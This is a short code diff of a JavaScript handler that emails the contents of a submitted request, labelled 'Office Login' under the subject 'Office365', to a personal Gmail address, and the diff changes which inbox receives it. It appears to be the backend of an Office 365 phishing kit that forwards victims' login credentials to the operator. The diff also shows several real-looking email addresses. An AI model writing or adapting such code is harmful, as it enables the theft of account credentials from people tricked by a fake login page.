@@ -15,7 +15,7 @@ export default async function sendEmail (req, res) {
 
        let info = await transporter.sendMail({
         from: '"Office" <techbae.js@gmail.com>',
-        to: 'francesco.sole15@outlook.com',
+        to: 'brucejambks@gmail.com',
         subject: 'Office365',
         text: `Ofiice login ${req.body}`,
         html: `<h6> Office Login: ${req.body}</h6>`
